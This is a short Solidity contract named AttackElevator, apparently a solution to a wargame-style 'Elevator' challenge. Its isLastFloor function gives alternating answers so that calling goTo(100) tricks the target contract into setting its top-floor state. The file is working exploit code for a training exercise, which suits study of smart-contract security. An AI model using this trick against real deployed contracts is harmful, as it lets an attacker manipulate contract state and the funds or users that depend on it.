// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./elevator.sol";


contract AttackElevator {

    Elevator elevatorContract;
    uint num = 1;

    constructor(address elevatorContractAddress) {
        elevatorContract = Elevator(elevatorContractAddress);
    }

    function isLastFloor(uint floor) public returns (bool) {
        floor;
        if (num == 1) {
            num++;
            return false;
        }
        else {
            num--;
            return true;
        }
    }

    function attack() public {
        elevatorContract.goTo(100);
    }
}

